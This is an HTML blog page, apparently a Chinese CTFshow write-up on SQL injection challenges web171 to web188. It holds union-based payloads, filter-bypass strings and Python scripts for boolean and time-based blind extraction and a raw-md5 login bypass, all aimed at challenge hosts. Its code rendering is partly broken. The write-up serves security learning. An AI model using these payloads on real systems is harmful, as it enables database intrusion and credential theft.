@@ -1,0 +1,1075 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CTFshow WriteUps WEB入门 sql注入web171 &#x2F;&#x2F;查表名 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+   &#x2F;&#x2F;查列名 1&#39; union select 1,2,group_concat(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF_show_Web入门_sql注入">
+<meta property="og:url" content="http://example.com/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="luelueking的ctf之路">
+<meta property="og:description" content="CTFshow WriteUps WEB入门 sql注入web171 &#x2F;&#x2F;查表名 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+   &#x2F;&#x2F;查列名 1&#39; union select 1,2,group_concat(">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-21T11:34:59.000Z">
+<meta property="article:modified_time" content="2022-07-21T06:53:46.938Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>CTF_show_Web入门_sql注入 - luelueking的ctf之路</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF_show_Web入门_sql注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-07-21 19:34" pubdate>
+          2022年7月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          59k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          490 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CTF_show_Web入门_sql注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr>
+<h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><ul>
+<li><pre><code class="hljs">//查表名
+1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+ 
+//查列名
+1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_user&#39; --+
+ 
+//查flag
+1&#39; union select id,username,password from ctfshow_user --+
+
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs q"><br>### web172<br><br>- ```<br>  <span class="hljs-comment">//查数据库库名</span><br>  <span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()--+<br>  结果为ctfshow_web<br>  <br>  <span class="hljs-comment">//查数据库表名</span><br>  <span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;ctfshow_web&#x27;--+<br>  结果ctfshow_user,ctfshow_user2<br>  <br>  <span class="hljs-comment">//查询列名</span><br>  <span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;ctfshow_user2&#x27;--+<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>发现返回逻辑屏蔽了flag</p>
+</li>
+<li><p>使用hex绕过</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>1’ union select to_base64(username),hex(password) from ctfshow_user2 –+</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>- 再解码<br><br><span class="hljs-comment">### web173</span><br><br>- 类似web172<br><br>- ```<br>  <span class="hljs-number">1</span>&#x27; union select <span class="hljs-built_in">id</span>,hex(username),hex(password) <span class="hljs-keyword">from</span> ctfshow_user3<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><ul>
+<li><p>看了WP发现这题的关键网址</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1">http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1</a></p>
+</li>
+<li><p>盲注</p>
+</li>
+<li><p>为了不被鄙视（用sqlmap），决定琢磨一下脚本</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>import requests</p>
+<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1&#39;">http://af1114ed-10d8-46ab-b33d-2232725c09cf.challenge.ctf.show/api/v4.php?id=1&#39;</a> and “<br>result &#x3D; ‘’<br>i &#x3D; 0</p>
+<p>while True:<br>i &#x3D; i + 1<br>head &#x3D; 32<br>tail &#x3D; 127<br><br>while head &lt; tail:<br>    mid &#x3D; (head + tail) &gt;&gt; 1<br>    payload &#x3D; f’1&#x3D;if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))&gt;{mid},1,0) – -‘<br>    r &#x3D; requests.get(url + payload)<br>    if “admin” in r.text:<br>        head &#x3D; mid + 1<br>    else:<br>        tail &#x3D; mid<br><br>if head !&#x3D; 32:<br>    result +&#x3D; chr(head)<br>else:<br>    break<br>print(result)</p>
+</li>
+</ul>
+<h1 id="解释一下payload"><a href="#解释一下payload" class="headerlink" title="解释一下payload"></a>解释一下payload</h1><h1 id="substr-str-i-i-的意思是从str字符中的第-i-个位置开始返回一个字符"><a href="#substr-str-i-i-的意思是从str字符中的第-i-个位置开始返回一个字符" class="headerlink" title="substr(str,{i},i)的意思是从str字符中的第{i}个位置开始返回一个字符"></a>substr(str,{i},i)的意思是从str字符中的第{i}个位置开始返回一个字符</h1><h1 id="ascii-是将一个字符转化为ASCII值"><a href="#ascii-是将一个字符转化为ASCII值" class="headerlink" title="ascii()是将一个字符转化为ASCII值"></a>ascii()是将一个字符转化为ASCII值</h1><h1 id="if-ascii-substr-…-gt-mid-1-0-语句进行判断，如果返回这个字符的ASCII值大于-mid-则返回1，否则返回0。然后结合前面的f’1-x3D-…-，返回1的话，1-x3D-1成立；返回1-x3D-0的话不成立，从而达到二分法缩小范围的目的。"><a href="#if-ascii-substr-…-gt-mid-1-0-语句进行判断，如果返回这个字符的ASCII值大于-mid-则返回1，否则返回0。然后结合前面的f’1-x3D-…-，返回1的话，1-x3D-1成立；返回1-x3D-0的话不成立，从而达到二分法缩小范围的目的。" class="headerlink" title="if(ascii(substr(….))&gt;{mid},1,0)语句进行判断，如果返回这个字符的ASCII值大于{mid}则返回1，否则返回0。然后结合前面的f’1&#x3D;…..，返回1的话，1&#x3D;1成立；返回1&#x3D;0的话不成立，从而达到二分法缩小范围的目的。"></a>if(ascii(substr(….))&gt;{mid},1,0)语句进行判断，如果返回这个字符的ASCII值大于{mid}则返回1，否则返回0。然后结合前面的f’1&#x3D;…..，返回1的话，1&#x3D;1成立；返回1&#x3D;0的话不成立，从而达到二分法缩小范围的目的。</h1>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web175</span><br><br>- 时间盲注：适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用<span class="hljs-built_in">sleep</span>函数，制造时间延迟，由回显时间来判断是否报错。<br><br>- ```python<br>  <span class="hljs-comment"># @Author:Y4tacker</span><br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://cf28b506-9689-4c18-b1ae-b94d612d996c.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br>  <br>  result = <span class="hljs-string">&#x27;&#x27;</span><br>  i = 0<br>  <br>  <span class="hljs-keyword">while</span> True:<br>      i = i + 1<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>          payload = f<span class="hljs-string">&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br>          try:<br>              r = requests.get(url + payload, <span class="hljs-built_in">timeout</span>=0.5)<br>              <span class="hljs-built_in">tail</span> = mid<br>          except Exception as e:<br>              <span class="hljs-built_in">head</span> = mid + 1<br>  <br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          result += chr(<span class="hljs-built_in">head</span>)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br>      <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><ul>
+<li><p>大小写绕过</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; uNion <span class="hljs-keyword">sElect</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user --+<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><ul>
+<li><p>&#x2F;**&#x2F;绕过空格</p>
+</li>
+<li><p>%23就是#</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>1’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;password,1,1&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;ctfshow_user&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;username&#x2F;</strong>&#x2F;&#x3D;’flag’%23</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">178</span><br><br>- 过滤了空格与*号等用`<span class="hljs-variable">%09</span>`绕过<br><br>- ```<br>  <span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%09</span>union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><ul>
+<li>&#96;&#96;&#96;<br>1’or’1’&#x3D;’1’%23 #一句话，其实前面也可以<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>- ```<br>  <span class="hljs-number">1</span>&#x27;union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%23</span> #过滤了<span class="hljs-variable">%09</span>那就<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web180-182"><a href="#web180-182" class="headerlink" title="web180~182"></a>web180~182</h3><ul>
+<li>&#96;&#96;&#96;<br>-1’or(id&#x3D;26)and’1’&#x3D;’1<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web183</span><br><br>- 首先看提示需要post传参`tableName=ctfshow_user`发现有回显<br>  跑脚本<br><br>- ```pyhon<br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://cc9ac480-5917-4e26-8d69-78f43bc6ffa3.challenge.ctf.show/select-waf.php&quot;</span><br>  str = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span><br>  flag = <span class="hljs-string">&quot;ctfshow&#123;&quot;</span><br>   <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">40</span>):<br>      <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:<br>          data=&#123;<br>              <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.format(flag+j)<br>          &#125;<br>          result = requests.post(url,data)<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user_count = 1&#x27;</span> <span class="hljs-keyword">in</span> result.text:<br>              flag += j<br>              print(flag)<br>              <span class="hljs-keyword">if</span> j == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>                  <span class="hljs-keyword">exit</span>()<br>              <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h3><ul>
+<li><p>其中 where 被过滤了，需要使用连接查询</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>import requests<br>import sys</p>
+<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://9adb647c-75c6-410d-a688-cf6d91a3259e.challenge.ctf.show:8080/select-waf.php&quot;">http://9adb647c-75c6-410d-a688-cf6d91a3259e.challenge.ctf.show:8080/select-waf.php&quot;</a></p>
+<p>flag &#x3D; “ctfshow{“</p>
+<p>str &#x3D; “0123456789-abcdefghijklmnopqrstuvwxyz{}”</p>
+<p>def str_to_hex(s):<br>return ‘’.join([hex(ord(c)).replace(“0x”,’’)for c in s])<br>payload &#x3D; “ctfshow_user as a right join ctfshow_user as b on b.pass like {}”</p>
+<p>for i in range(0,100):<br>for j in str:<br>    data &#x3D; {<br>        “tableName” : payload.format(“0x”+str_to_hex(flag+j+’%’))<br>        # ‘tableName’: “ctfshow_user a inner join ctfshow_user b on b.pass like {}”.format(“0x” + str_to_hex(flag + j + “%”))<br>    }<br>    # print(data)<br>    result &#x3D; requests.post(url&#x3D;url,data&#x3D;data)<br>    if ‘$user_count &#x3D; 43’ in result.text:<br>        flag +&#x3D; j<br>        print(flag)<br>        if j &#x3D;&#x3D; ‘}’:<br>            sys.exit()</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>### web185~<span class="hljs-number">186</span><br><br>- 过滤了数字<br>- 详细看脚本<br><br>- ```python<br>  <span class="hljs-keyword">import</span> requests<br>  <br>  url = <span class="hljs-string">&quot;http://4a5cc3ec-ec48-4ed3-b0c3-0a96305c06d2.challenge.ctf.show/select-waf.php&quot;</span><br>  <br>  flag = <span class="hljs-string">&#x27;ctfsho&#x27;</span><br>  <br>  <br>  <span class="hljs-keyword">def</span> createNum(n):	#构造数字函数，原理就是是<span class="hljs-keyword">true</span>的值是<span class="hljs-number">1</span>，累加<span class="hljs-keyword">true</span>构造数值<br>      num = <span class="hljs-string">&#x27;true&#x27;</span><br>      <span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>:<br>          <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;true&#x27;</span><br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-keyword">for</span> i in range(n - <span class="hljs-number">1</span>):<br>              num += <span class="hljs-string">&quot;+true&quot;</span><br>      <span class="hljs-keyword">return</span> num<br>  <br>  <br>  <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">45</span>):<br>      <span class="hljs-keyword">if</span> i &lt;= <span class="hljs-number">5</span>:<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">for</span> j in range(<span class="hljs-number">127</span>):<br>          data = &#123;<br>              <span class="hljs-string">&quot;tableName&quot;</span>: f<span class="hljs-string">&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;createNum(i)&#125;,&#123;createNum(1)&#125;)regexp(char(&#123;createNum(j)&#125;)))&quot;</span><br>          &#125; <br>          #解释一下<span class="hljs-keyword">char</span>(&#123;createNum(j)&#125;))：<span class="hljs-keyword">char</span>(<span class="hljs-number">120</span>)=x, 所以<span class="hljs-keyword">char</span>(<span class="hljs-keyword">true</span>+<span class="hljs-keyword">true</span>+…<span class="hljs-number">120</span>个…+<span class="hljs-keyword">true</span>)=x；<span class="hljs-keyword">char</span>(<span class="hljs-number">50</span>)=<span class="hljs-number">2</span>, 所以<span class="hljs-keyword">char</span>(<span class="hljs-keyword">true</span>+…<span class="hljs-number">50</span>个…+<span class="hljs-keyword">true</span>)=<span class="hljs-number">2</span>;<br>          r = requests.post(url, data=data)<br>          <span class="hljs-keyword">if</span> r.text.<span class="hljs-keyword">find</span>(<span class="hljs-string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="hljs-number">0</span>:<br>              <span class="hljs-keyword">if</span> chr(j) != <span class="hljs-string">&quot;.&quot;</span>:<br>                  flag += chr(j)<br>  <br>                  <span class="hljs-keyword">print</span>(flag.lower())<br>                  <span class="hljs-keyword">if</span> chr(j) == <span class="hljs-string">&quot;&#125;&quot;</span>:<br>                      exit(<span class="hljs-number">0</span>)<br>                  <span class="hljs-keyword">break</span><br>  <br>  <br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h3><ul>
+<li><p><code>md5(string,raw)</code>其中raw参数可选，且有两种选择</p>
+<ul>
+<li>FALSE：32位16进制的字符串</li>
+<li>TRUE：16位原始二进制格式的字符串</li>
+</ul>
+</li>
+<li><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password&#x3D;‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>import requests</p>
+<p>url2 &#x3D; ‘ <a target="_blank" rel="noopener" href="http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/api/&#39;">http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/api/&#39;</a></p>
+<p>payload &#x3D; {<br>“username”:”admin”,<br>“password”:”ffifdyop”<br>}</p>
+<p>res &#x3D; requests.post(url&#x3D;url2,data&#x3D;payload).text</p>
+<p>print(res)</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>### web188<br><br>- Mysql弱比较<br><br>- 你可以尝试一下在数据库中使用这样的语句：<br>  <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> stu <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-number">0</span>很有可能是能查询出东西的，即使你没有<span class="hljs-type">name</span>为<span class="hljs-number">0</span>的数据<br><br>  这是因为数据库进行了弱比较，它<span class="hljs-keyword">select</span>出所有<span class="hljs-type">name</span>是以字母为开头的数据<br>  